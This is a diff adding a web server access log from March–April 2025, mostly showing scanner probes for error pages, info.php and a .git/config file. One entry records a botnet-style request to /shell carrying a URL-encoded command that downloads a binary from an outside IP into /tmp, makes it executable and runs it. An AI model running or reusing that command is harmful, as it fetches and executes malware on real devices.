@@ -1,0 +1,11 @@
+
+188.130.155.167 - - [13/Mar/2025:10:32:01 +0000] "GET /error HTTP/1.1" 500 186 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0" "-"
+188.130.155.167 - - [13/Mar/2025:14:11:52 +0000] "GET /error HTTP/1.1" 500 186 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0" "-"
+188.130.155.167 - - [13/Mar/2025:14:11:55 +0000] "GET /error HTTP/1.1" 500 186 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0" "-"
+194.233.91.58 - - [13/Mar/2025:14:21:26 +0000] "GET /info.php HTTP/1.1" 502 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
+188.130.155.167 - - [13/Mar/2025:19:29:48 +0000] "GET /info.php HTTP/1.1" 502 166 "https://aquaf1na.fun/" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0" "-"
+91.215.85.31 - - [13/Mar/2025:23:13:40 +0000] "GET /errors/.git/config HTTP/1.1" 500 186 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1" "-"
+188.130.155.167 - - [14/Mar/2025:14:50:07 +0000] "GET /error HTTP/1.1" 500 186 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0" "-"
+124.220.11.157 - - [16/Mar/2025:19:08:02 +0000] "GET /shell?cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F45.95.147.201%2Fbins%2Farm7%3B%20chmod%20777%20arm7%3B%20.%2Farm7%20jaws%3B HTTP/1.1\x5Cr\x5CnUser-Agent: Mozila/5.0\x5Cr\x5CnHost: 127.0.0.1:80\x5Cr\x5CnAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\x5Cr\x5CnConnection: keep-alive\x5Cr\x5Cn\x5Cr\x5Cn\x11" 400 166 "-" "-" "-"
+203.55.131.5 - - [26/Mar/2025:07:37:36 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xFCH\x89\x81\x90\xF9 \xBE\x90\x81B\x9Bx\xCA\x8C9\x8D\xC8\x85\xCDs\xCE\xCA\xDE J\xD9a\xB4\xB5?\xDB \xBA\xC4\xCBj\x96\x17\x0FQ`5\xB1\xD4>\xAEz\x18\x9F\x8A\xC72\xAD\x04\xDB0\x1D\xFABt\xEA\x08\xCC\xF3\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-" "-"
+154.83.103.14 - - [01/Apr/2025:06:14:58 +0000] "GET /error.log HTTP/1.1" 500 588 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" "-"
